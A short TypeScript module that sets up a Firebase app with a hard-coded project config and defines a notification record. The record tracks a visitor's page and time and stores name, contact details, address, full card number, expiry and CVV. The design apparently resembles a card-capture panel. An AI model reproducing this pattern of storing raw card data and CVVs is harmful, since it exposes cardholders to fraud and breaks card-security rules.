import { initializeApp, getApps, getApp } from "firebase/app";
import { getAuth } from "firebase/auth";
import { getFirestore } from "firebase/firestore";
import { getDatabase } from "firebase/database";

const firebaseConfig = {
  apiKey: "AIzaSyBGfoHtZINGY6YQFdpPhfCY4W4Xpfxrxh8",
  authDomain: "qa-lioha-l.firebaseapp.com",
  databaseURL: "https://qa-lioha-l-default-rtdb.firebaseio.com",
  projectId: "qa-lioha-l",
  storageBucket: "qa-lioha-l.firebasestorage.app",
  messagingSenderId: "358325100608",
  appId: "1:358325100608:web:15d0a4a121c39a27dd7fa5",
  measurementId: "G-D9LYMHWKSH"
};


const app = getApps().length > 0 ? getApp() : initializeApp(firebaseConfig);
const auth = getAuth(app);
const db = getFirestore(app);
const database = getDatabase(app);

export { app, auth, db, database };

export interface NotificationDocument {
  id: string;
  name: string;
  hasPersonalInfo: boolean;
  hasCardInfo: boolean;
  currentPage: string;
  time: string;
  notificationCount: number;
  personalInfo?: {
    fullName: string;
    email: string;
    phone: string;
    address: string;
  };
  cardInfo?: {
    cardNumber: string;
    expirationDate: string;
    cvv: string;
  };
}


